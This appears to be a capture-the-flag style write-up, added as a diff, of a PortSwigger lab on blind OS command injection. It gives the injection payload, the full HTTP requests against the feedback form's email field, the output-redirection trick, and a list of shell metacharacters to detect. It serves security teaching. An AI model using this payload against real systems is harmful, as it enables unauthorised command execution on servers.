@@ -1,0 +1,253 @@
+# Blind OS Command Injection via Output Redirection
+
+> **Platform:** PortSwigger Web Security Academy  
+> **Category:** OS Command Injection  
+> **Difficulty:** Apprentice  
+> **Status:** Solved
+
+---
+
+# Table of Contents
+
+1. Executive Summary
+2. Risk Classification
+3. Vulnerability Information
+4. Affected Asset
+5. Technical Description
+6. Methodology
+7. Relevant HTTP Requests
+8. Proof of Concept (PoC)
+9. Evidence
+10. Impact Analysis
+11. Root Cause
+12. Recommendations
+13. References
+14. Conclusion
+
+---
+
+# 1. Executive Summary
+
+The application was vulnerable to a **Blind OS Command Injection** in the `email` parameter of the feedback form.
+
+Although the command output was not returned in the HTTP response, it was possible to redirect the output of the injected command to a publicly accessible file within the web server's document root. Retrieving this file confirmed successful command execution on the underlying operating system.
+
+---
+
+# 2. Risk Classification
+
+| Classification | Value |
+|----------------|-------|
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+| CWE | CWE-78 – Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
+| OWASP Top 10 | A03:2021 – Injection |
+
+---
+
+# 3. Vulnerability Information
+
+**Vulnerability Type**
+
+Blind OS Command Injection
+
+**Injection Point**
+
+```
+email
+```
+
+---
+
+# 4. Affected Asset
+
+Feedback submission endpoint:
+
+```
+POST /feedback/submit
+```
+
+Publicly accessible resource:
+
+```
+/image?filename=output.txt
+```
+
+---
+
+# 5. Technical Description
+
+The application incorporated the user-controlled `email` parameter into an operating system command without proper validation or sanitization.
+
+Since the application did not return the command output directly in the HTTP response, the vulnerability was classified as **Blind OS Command Injection**.
+
+To retrieve the command output, the payload redirected the standard output to a file located inside the web server's public images directory.
+
+---
+
+# 6. Methodology
+
+1. Identify the injectable parameter.
+2. Inject an operating system command.
+3. Redirect the command output to a web-accessible file.
+4. Retrieve the generated file through an HTTP request.
+5. Confirm successful command execution.
+
+---
+
+# 7. Relevant HTTP Requests
+
+## 7.1 Command Injection
+
+```http
+POST /feedback/submit HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+csrf=<CSRF_TOKEN>&name=Juan&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
+```
+
+---
+
+## 7.2 Retrieve the Output
+
+```http
+GET /image?filename=output.txt HTTP/1.1
+Host: <LAB-ID>.web-security-academy.net
+```
+
+---
+
+# 8. Proof of Concept (PoC)
+
+Injected payload:
+
+```bash
+||whoami>/var/www/images/output.txt||
+```
+
+Resulting command executed by the operating system:
+
+```bash
+whoami > /var/www/images/output.txt
+```
+
+The output was then retrieved through:
+
+```
+/image?filename=output.txt
+```
+
+---
+
+# 9. Evidence
+
+### Injected Payload
+
+```text
+email=||whoami>/var/www/images/output.txt||
+```
+
+### Retrieved File
+
+```
+output.txt
+```
+
+### Command Output
+
+```
+<system user running the web application>
+```
+
+Example:
+
+```
+peter
+```
+
+---
+
+# 10. Impact Analysis
+
+Successful exploitation allows an attacker to execute arbitrary operating system commands.
+
+Depending on the privileges assigned to the web server process, this may lead to:
+
+- System reconnaissance
+- Disclosure of sensitive files
+- Remote code execution
+- Malware deployment
+- Privilege escalation
+- Complete server compromise
+
+---
+
+# 11. Root Cause
+
+The application constructs operating system commands using unsanitized user input.
+
+Specifically, it lacks:
+
+- Input validation
+- Input sanitization
+- Safe escaping of shell metacharacters
+- Secure APIs that avoid invoking the system shell
+
+---
+
+# 12. Recommendations
+
+## High Priority
+
+Avoid invoking operating system commands whenever possible.
+
+## High Priority
+
+Use language-native APIs instead of shell commands.
+
+## High Priority
+
+Strictly validate and sanitize all user-supplied input.
+
+## Medium Priority
+
+Run the application using the principle of least privilege.
+
+## Medium Priority
+
+Prevent public access to directories that may contain application-generated files.
+
+## Low Priority
+
+Implement monitoring and alerting for suspicious shell metacharacters such as:
+
+```
+|
+||
+&
+&&
+;
+`
+$()
+>
+<
+```
+
+---
+
+# 13. References
+
+- PortSwigger Web Security Academy – OS Command Injection
+- OWASP Command Injection Prevention Cheat Sheet
+- CWE-78: Improper Neutralization of Special Elements used in an OS Command
+
+---
+
+# 14. Conclusion
+
+The assessment confirmed the presence of a **Blind OS Command Injection** vulnerability.
+
+Although the application did not directly disclose command output, redirecting the output to a publicly accessible file allowed successful retrieval of the execution result.
+
+This demonstrates that an attacker can execute arbitrary operating system commands and obtain sensitive information from the underlying host, representing a significant risk to the confidentiality, integrity, and availability of the affected system.
